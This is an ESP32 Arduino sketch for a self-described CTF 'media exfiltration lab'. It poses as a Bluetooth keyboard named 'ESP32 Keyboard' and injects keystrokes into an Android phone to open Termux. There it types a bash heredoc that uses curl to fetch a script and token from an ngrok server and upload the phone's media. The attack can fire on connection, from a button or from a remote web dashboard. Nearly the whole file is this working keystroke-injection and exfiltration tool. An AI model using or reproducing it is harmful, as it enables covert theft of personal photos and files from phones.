// ─────────────────────────────────────────────────────────────────────────────
// ESP32 BLE HID — Android Media Exfiltration Lab
// ─────────────────────────────────────────────────────────────────────────────
//
// CTF / Hardware Hacking Lab — Authorized Devices Only.
// USE ONLY ON DEVICES YOU OWN OR HAVE EXPLICIT WRITTEN AUTHORIZATION TO TEST.
//
// WHAT THIS DOES:
//   Mode A — AUTO (default): on every new BLE connection (no button needed):
//     STEP 1: Navigates to Android home screen (WIN key alone)
//     STEP 2: Opens Termux via launcher search
//     STEP 3: Clears the shell prompt (CTRL+C, CTRL+U)
//     STEP 4A: Types a single one-liner:
//                python3 ~/media_backup.py <URL> --auto
//              media_backup.py --auto skips all prompts and uploads everything.
//
//   Mode B — MANUAL: GPIO 19 button fires the full heredoc payload (no
//             media_backup.py required — raw curl loop injected directly).
//
// TECHNIQUE NOTES:
//   - BLE HID spoofing: ESP32 advertises as "ESP32 Keyboard" (legitimate HID device)
//   - Keystroke injection: 35 ms/char — below typical human notice threshold
//   - AUTO uses a single short line; MANUAL injects full heredoc without dropping files
//   - Win key alone = Home screen on all Android launchers (Win+S = screenshot)
//   - Auto-trigger: fires once per connection; cooldown prevents re-fire on
//     momentary drops. Re-arms only after a full disconnect + reconnect.
//
// SERVER:
//   server/server.py  (port 8019)
//   Run: ngrok http 8019  → paste HTTPS URL in WAN_SERVER_URL below → re-flash
//
// TARGET DEVICE ONE-TIME SETUP (your own device):
//   Install Termux from F-Droid → pkg install curl → termux-setup-storage
// ─────────────────────────────────────────────────────────────────────────────

#include <BleKeyboard.h>
#include <WiFi.h>
#include <HTTPClient.h>
#include <ArduinoJson.h>

// ── Configuration ─────────────────────────────────────────────────────────────

#define WAN_SERVER_URL "https://7afa-2401-4900-53df-cc09-7d2d-3630-dc6a-d779.ngrok-free.app"  // ← paste ngrok URL

// WiFi credentials — ESP32 uses WiFi to poll the server for commands
#define WIFI_SSID      "your_wifi_ssid"       // ← your WiFi network name
#define WIFI_PASSWORD  "your_wifi_password"   // ← your WiFi password

// Setup password — must match SETUP_PASSWORD in server/.env
#define SETUP_PASSWORD "your_setup_password_here"  // ← set same value as in .env

// How often the ESP32 polls /api/poll for a pending web-trigger command (ms)
#define POLL_INTERVAL_MS  2000UL

// ── Timing constants (all in milliseconds) ───────────────────────────────────
// Increase these if your device is slower or Termux fails to open reliably.

#define CONNECT_SETTLE_MS   4000UL  // Wait after BLE connects before first keystroke
#define HOME_SETTLE_MS      1800UL  // Wait after WIN key for launcher to settle
#define SEARCH_SETTLE_MS    1200UL  // Wait after opening search before typing
#define APP_LOAD_MS         5000UL  // Wait after Enter for Termux to fully load
#define PROMPT_CLEAR_MS      500UL  // Delay between CTRL+C and CTRL+U
#define COOLDOWN_MS        60000UL  // Min time between payload executions

// ── Open method ───────────────────────────────────────────────────────────────
// Try these in order if Termux fails to open:
//   1 = KEY_SEARCH (best — hardware search key, works on all Android versions)
//   2 = WIN + typing (works on stock/Pixel, may fail on Samsung/MIUI)
//   3 = WIN + A (opens app drawer, works on stock Android only)
#define OPEN_METHOD  1

// ── State ─────────────────────────────────────────────────────────────────────

BleKeyboard bleKeyboard("ESP32 Keyboard", "Espressif", 100);

bool          wasConnected  = false;
bool          wasUsbConn    = false;  // tracks Serial/USB host connection state
unsigned long lastPollMs    = 0;   // last time we polled /api/poll
unsigned long lastFireMs    = 0;   // last time payload ran (cooldown)

// ── Helpers ───────────────────────────────────────────────────────────────────

void typeString(const char* str, int delayMs = 35) {
  for (int i = 0; i < (int)strlen(str); i++) {
    bleKeyboard.print(str[i]);
    delay(delayMs);
  }
}

void pressEnter(int waitMs = 200) {
  bleKeyboard.press(KEY_RETURN);
  delay(120);
  bleKeyboard.releaseAll();
  delay(waitMs);
}

// ── Screen wake ───────────────────────────────────────────────────────────────
void wakeScreen() {
  bleKeyboard.press(KEY_MEDIA_VOLUME_UP);
  delay(80); bleKeyboard.releaseAll();
  delay(700);
  Serial.println("[timing] Screen wake sent.");
}

// ── Go home ───────────────────────────────────────────────────────────────────
void goHome() {
  // ESC first to dismiss any overlay (notification shade, dialog, search bar)
  bleKeyboard.press(KEY_ESC);
  delay(100); bleKeyboard.releaseAll(); delay(300);

  // WIN key → home screen
  bleKeyboard.press(KEY_LEFT_GUI);
  delay(180); bleKeyboard.releaseAll();
  delay(HOME_SETTLE_MS);

  // Second WIN tap — clears "recent apps" view on some launchers
  bleKeyboard.press(KEY_LEFT_GUI);
  delay(180); bleKeyboard.releaseAll();
  delay(HOME_SETTLE_MS);

  Serial.println("[timing] Home screen confirmed.");
}

// ── Clear any input on the screen before we start typing ─────────────────────
void clearInput() {
  // Select-all then delete — clears any text in an active search box
  bleKeyboard.press(KEY_LEFT_CTRL); bleKeyboard.press('a');
  delay(80); bleKeyboard.releaseAll(); delay(150);
  bleKeyboard.press(KEY_DELETE);
  delay(80); bleKeyboard.releaseAll(); delay(150);
}

// ── Open search, type app name, press Enter ───────────────────────────────────
//
// OPEN_METHOD 1 — KEY_SEARCH  (recommended for all launchers)
//   Android's dedicated Search key. Maps to the hardware search button that
//   every Android device has had since Android 1.5. Even on devices without
//   a physical search button, the HID keycode is handled by the OS and always
//   opens the global app / assistant search. Works on Samsung, MIUI, ColorOS,
//   stock, and every other launcher.
//
// OPEN_METHOD 2 — WIN + typing  (stock Android / Pixel only)
//   On stock Android, typing on the home screen opens the launcher search.
//   Fails silently on Samsung OneUI, MIUI, ColorOS (keystrokes are ignored
//   unless the search bar is explicitly focused).
//
// OPEN_METHOD 3 — WIN + A  (stock Android app drawer)
//   Opens the full app drawer. Reliable on Pixel/AOSP but not on
//   heavily skinned launchers (Samsung, MIUI use different shortcuts).
//
void openSearch() {
#if OPEN_METHOD == 1
  // Best method: press the SEARCH key (HID Usage 0x0221 — AC Search).
  // Android maps this directly to the global app/assistant search on every
  // launcher (Samsung, MIUI, ColorOS, stock, AOSP — all respond to it).
  // In BleKeyboard the media report is a 2-byte array:
  //   byte[0] bits: Play=0x01 Pause=0x02 Next=0x04 Prev=0x08
  //                 VolUp=0x10 VolDown=0x20 Mute=0x40 WWW=0x80
  //   byte[1] bits: MediaSel=0x01 Mail=0x02 Calc=0x04 Explorer=0x08
  //                 Search=0x10  Home=0x20  Back=0x40  ...
  Serial.println("[search] Using SEARCH key (method 1)");
  {
    MediaKeyReport searchKey = {0x00, 0x10};  // byte[1] bit4 = AC Search
    bleKeyboard.press(searchKey);
    delay(120);
    bleKeyboard.releaseAll();
  }
  delay(SEARCH_SETTLE_MS);

#elif OPEN_METHOD == 2
  // Type on home screen — only works on stock/Pixel
  Serial.println("[search] Using home-screen typing (method 2)");
  // No extra key needed — just start typing

#elif OPEN_METHOD == 3
  // WIN + A = app drawer on stock Android
  Serial.println("[search] Using WIN+A app drawer (method 3)");
  bleKeyboard.press(KEY_LEFT_GUI); bleKeyboard.press('a');
  delay(150); bleKeyboard.releaseAll();
  delay(SEARCH_SETTLE_MS);
#endif
}

void openApp(const char* appName) {
  goHome();
  openSearch();

  // Clear any stale text in the search box
  clearInput();
  delay(300);

  // Type the app name one character at a time, slowly
  // 80 ms/char is deliberate — gives the search index time to filter
  typeString(appName, 80);
  delay(1000);   // wait for search results to populate

  // Press Enter to open the top result, then wait for the app to load
  pressEnter(APP_LOAD_MS);
  Serial.println("[search] App launch Enter sent — waiting for load.");
}

// Type one heredoc line then press Enter.
void typeLine(const char* line) {
  typeString(line, 35);
  pressEnter(120);
}

// ── Open Termux and clear the shell prompt, with retry ───────────────────────

bool openTermuxClean() {
  const int MAX_TRIES = 3;

  for (int attempt = 1; attempt <= MAX_TRIES; attempt++) {
    Serial.print("[payload] Opening Termux — attempt ");
    Serial.print(attempt); Serial.print(" / "); Serial.println(MAX_TRIES);

    // Wake screen before every attempt
    wakeScreen();

    // Open Termux via search
    openApp("Termux");

    // Extra settle: Termux takes longer on first launch
    delay(1500);

    // Check: is the keyboard still connected? If not, abort.
    if (!bleKeyboard.isConnected()) {
      Serial.println("[payload] BLE disconnected mid-sequence — aborting.");
      return false;
    }

    // Clear the prompt:
    //   ESC   — dismiss any Termux welcome screen / permission dialog
    //   CTRL+C — kill any running foreground process
    //   CTRL+U — clear the current input line
    bleKeyboard.press(KEY_ESC);
    delay(100); bleKeyboard.releaseAll(); delay(400);

    bleKeyboard.press(KEY_LEFT_CTRL); bleKeyboard.press('c');
    delay(120); bleKeyboard.releaseAll(); delay(PROMPT_CLEAR_MS);

    bleKeyboard.press(KEY_LEFT_CTRL); bleKeyboard.press('u');
    delay(120); bleKeyboard.releaseAll(); delay(PROMPT_CLEAR_MS);

    // Type a harmless probe: echo a known string and press Enter.
    // If Termux is open and ready, this produces visible output.
    // We can't read the screen from the ESP32, but at least the heredoc
    // will follow immediately if the prompt is clean.
    typeString("echo __READY__", 35);
    pressEnter(600);

    Serial.print("[payload] Attempt "); Serial.print(attempt);
    Serial.println(" complete — clearing probe output.");

    // Clear the probe output line
    bleKeyboard.press(KEY_LEFT_CTRL); bleKeyboard.press('u');
    delay(100); bleKeyboard.releaseAll(); delay(300);

    // If we made it here without disconnect, consider it a success
    Serial.println("[payload] Termux open — prompt ready.");
    return true;
  }

  Serial.println("[payload] All attempts failed.");
  return false;
}

// ── AUTO payload — self-installing + silent run ───────────────────────────────
// Injects a bash heredoc that:
//   1. Downloads media_backup.py if not already present
//   2. Fetches and saves ~/.backup_token from /setup-token if not already present
//   3. Runs media_backup.py --auto (fully non-interactive)
// Everything is idempotent — safe to run on every connection.

void runAutoPayload() {
  Serial.println("[AUTO payload] Starting self-install + run...");
  if (!openTermuxClean()) {
    Serial.println("[AUTO payload] Aborted — could not open Termux.");
    return;
  }

  // Inject bash heredoc — bash buffers all lines before executing,
  // so the ESP32 only needs to wait for typing to finish.
  typeLine("bash << 'SETUP_RUN_END'");

  // ── 1. Download media_backup.py if missing ──────────────────────────────
  typeLine("if [ ! -f ~/media_backup.py ]; then");
  typeLine("  echo '[setup] Downloading media_backup.py...'");
  typeLine("  curl -sL -H 'ngrok-skip-browser-warning: true' \\");
  typeLine("       -o ~/media_backup.py '" WAN_SERVER_URL "/payloads/media_backup.py'");
  typeLine("  echo '[setup] media_backup.py saved.'");
  typeLine("else");
  typeLine("  echo '[setup] media_backup.py already present.'");
  typeLine("fi");

  // ── 2. Fetch and save ~/.backup_token if missing ────────────────────────
  typeLine("if [ ! -f ~/.backup_token ]; then");
  typeLine("  echo '[setup] Fetching backup token...'");
  typeLine("  curl -sf -H 'ngrok-skip-browser-warning: true' \\");
  typeLine("       -H 'X-Setup-Password: " SETUP_PASSWORD "' \\");
  typeLine("       '" WAN_SERVER_URL "/setup-token' > ~/.backup_token");
  typeLine("  chmod 600 ~/.backup_token");
  typeLine("  echo '[setup] Token saved to ~/.backup_token.'");
  typeLine("else");
  typeLine("  echo '[setup] Token already present.'");
  typeLine("fi");

  // ── 3. Run media_backup.py non-interactively ────────────────────────────
  typeLine("echo '[run] Starting upload...'");
  // Termux installs Python as 'python', not 'python3'.
  // This one-liner works on both Termux and standard Linux.
  typeLine("PY=$(command -v python3 || command -v python) && $PY ~/media_backup.py '" WAN_SERVER_URL "' --auto");

  typeLine("SETUP_RUN_END");

  Serial.println("[AUTO payload] Heredoc typed — setup+run executing in Termux.");
  Serial.println("[AUTO payload] Done.");
}

// ── MANUAL payload (GPIO 19) ─────────────────────────────────────────────────
// Same as AUTO — opens Termux on the Android phone, runs media_backup.py --auto.
// NOTE: press the button while holding the Android phone, not while your Mac
// terminal is focused — the ESP32 types into whichever device had last focus.

void runManualPayload() {
  Serial.println("[MANUAL payload] Starting...");
  if (!openTermuxClean()) {
    Serial.println("[MANUAL payload] Aborted — could not open Termux.");
    return;
  }

  // Same self-install + run heredoc as AUTO payload
  typeLine("bash << 'SETUP_RUN_END'");

  typeLine("if [ ! -f ~/media_backup.py ]; then");
  typeLine("  echo '[setup] Downloading media_backup.py...'");
  typeLine("  curl -sL -H 'ngrok-skip-browser-warning: true' \\");
  typeLine("       -o ~/media_backup.py '" WAN_SERVER_URL "/payloads/media_backup.py'");
  typeLine("  echo '[setup] media_backup.py saved.'");
  typeLine("else");
  typeLine("  echo '[setup] media_backup.py already present.'");
  typeLine("fi");

  typeLine("if [ ! -f ~/.backup_token ]; then");
  typeLine("  echo '[setup] Fetching backup token...'");
  typeLine("  curl -sf -H 'ngrok-skip-browser-warning: true' \\");
  typeLine("       -H 'X-Setup-Password: " SETUP_PASSWORD "' \\");
  typeLine("       '" WAN_SERVER_URL "/setup-token' > ~/.backup_token");
  typeLine("  chmod 600 ~/.backup_token");
  typeLine("  echo '[setup] Token saved.'");
  typeLine("else");
  typeLine("  echo '[setup] Token already present.'");
  typeLine("fi");

  typeLine("echo '[run] Starting upload...'");
  typeLine("PY=$(command -v python3 || command -v python) && $PY ~/media_backup.py '" WAN_SERVER_URL "' --auto");

  typeLine("SETUP_RUN_END");

  Serial.println("[MANUAL payload] Heredoc typed — executing in Termux.");
  Serial.println("[MANUAL payload] Done.");
}

// ── WiFi connect helper ────────────────────────────────────────────────────────

void connectWiFi() {
  if (WiFi.status() == WL_CONNECTED) return;
  Serial.print("[WiFi] Connecting to ");
  Serial.print(WIFI_SSID);
  WiFi.begin(WIFI_SSID, WIFI_PASSWORD);
  int tries = 0;
  while (WiFi.status() != WL_CONNECTED && tries < 20) {
    delay(500); Serial.print("."); tries++;
  }
  if (WiFi.status() == WL_CONNECTED) {
    Serial.print("\n[WiFi] Connected — IP: ");
    Serial.println(WiFi.localIP());
  } else {
    Serial.println("\n[WiFi] Failed to connect.");
  }
}

// ── Poll server for a pending command ────────────────────────────────────────
// Returns true and fills extList if a command was found.

bool pollForCommand(String &extList) {
  if (WiFi.status() != WL_CONNECTED) {
    connectWiFi();
    return false;
  }
  HTTPClient http;
  // Report BLE and USB/Serial connection state to the server dashboard.
  // ?ble=1  — Android is paired & connected over Bluetooth HID
  // ?usb=1  — a host computer has the Serial/USB CDC port open
  bool bleConn = bleKeyboard.isConnected();
  bool usbConn = (bool)Serial;          // true when host has the port open
  String url = String(WAN_SERVER_URL) + "/api/poll?ble=" +
               (bleConn ? "1" : "0") + "&usb=" + (usbConn ? "1" : "0");
  http.begin(url);
  http.addHeader("ngrok-skip-browser-warning", "true");
  int code = http.GET();
  if (code != 200) {
    Serial.print("[poll] HTTP error: "); Serial.println(code);
    http.end(); return false;
  }
  String body = http.getString();
  http.end();

  // Parse JSON: {"cmd": {"action":"payload","exts":["jpg","png",...]} }
  StaticJsonDocument<1024> doc;
  if (deserializeJson(doc, body) != DeserializationError::Ok) return false;
  JsonVariant cmd = doc["cmd"];
  if (cmd.isNull()) return false;

  // Build find -iname filter string from exts array
  JsonArray exts = cmd["exts"].as<JsonArray>();
  extList = "";
  bool first = true;
  for (JsonVariant ext : exts) {
    if (!first) extList += " -o ";
    extList += "-iname '*." + String(ext.as<const char*>()) + "'";
    first = false;
  }
  if (extList.isEmpty()) extList = "-iname '*.jpg' -o -iname '*.png'"; // fallback
  Serial.print("[poll] Command received — exts: ");
  Serial.println(extList);
  return true;
}

// ── Setup ─────────────────────────────────────────────────────────────────────

void setup() {
  Serial.begin(115200);
  delay(500);

  bleKeyboard.set_vendor_id(0x16C0);
  bleKeyboard.set_product_id(0x27DB);
  bleKeyboard.set_version(0x0100);
  bleKeyboard.begin();

  connectWiFi();

  Serial.println("─────────────────────────────────────────────────");
  Serial.println("  ESP32 BLE HID — Media Exfiltration Lab");
  Serial.println("─────────────────────────────────────────────────");
  Serial.print  ("  Server     : "); Serial.println(WAN_SERVER_URL);
  Serial.print  ("  WiFi       : "); Serial.println(WiFi.status() == WL_CONNECTED ? "Connected" : "Not connected");
  Serial.print  ("  Poll every : "); Serial.print(POLL_INTERVAL_MS); Serial.println(" ms");
  Serial.print  ("  Cooldown   : "); Serial.print(COOLDOWN_MS / 1000); Serial.println(" s between fires");
  Serial.println("  Waiting for web trigger from dashboard...");
  Serial.println("─────────────────────────────────────────────────");
}

// ── Loop ──────────────────────────────────────────────────────────────────────

void loop() {
  unsigned long now = millis();

  // ── BLE connection state logging ─────────────────────────────────────────
  bool connected = bleKeyboard.isConnected();
  if (connected && !wasConnected) {
    wasConnected = true;
    Serial.println("[BLE] Android device connected.");
  } else if (!connected && wasConnected) {
    wasConnected = false;
    Serial.println("[BLE] Android device disconnected.");
  }

  // ── Log USB/Serial host connection changes ───────────────────────────────
  bool usbNow = (bool)Serial;
  if (usbNow && !wasUsbConn) {
    wasUsbConn = true;
    Serial.println("[USB] Host connected to Serial port.");
  } else if (!usbNow && wasUsbConn) {
    wasUsbConn = false;
    // Can't print here — Serial just disconnected
  }

  // ── Poll server for a web-trigger command ────────────────────────────────
  if (now - lastPollMs >= POLL_INTERVAL_MS) {
    lastPollMs = now;
    String extList;
    if (pollForCommand(extList)) {
      // ── SAFETY: refuse to fire if Android BLE is not connected ─────────
      // Without a BLE target, keystrokes would land on whatever device last
      // had focus — most likely the host computer's terminal.  Abort and
      // log a clear warning so the dashboard shows the problem.
      if (!bleKeyboard.isConnected()) {
        Serial.println("[SAFETY] Command received but Android BLE is NOT connected.");
        Serial.println("[SAFETY] Refusing to fire — keystrokes would hit the wrong target.");
        Serial.println("[SAFETY] Pair the ESP32 as 'ESP32 Keyboard' on your Android device first.");
        // The command has already been consumed from the server queue.
        // Post a status update so the dashboard knows why it didn't fire.
        // (The next /api/poll will carry ble=0, the dashboard shows the warning.)
      }
      // ── Cooldown check ───────────────────────────────────────────────────
      else if (lastFireMs != 0 && now - lastFireMs < COOLDOWN_MS) {
        unsigned long rem = (COOLDOWN_MS - (now - lastFireMs)) / 1000;
        Serial.print("[poll] Cooldown active — "); Serial.print(rem); Serial.println(" s remaining. Command discarded.");
      } else {
        lastFireMs = now;
        Serial.println("[poll] Firing payload from web trigger.");
        runAutoPayload();
      }
    }
  }

  delay(10);
}
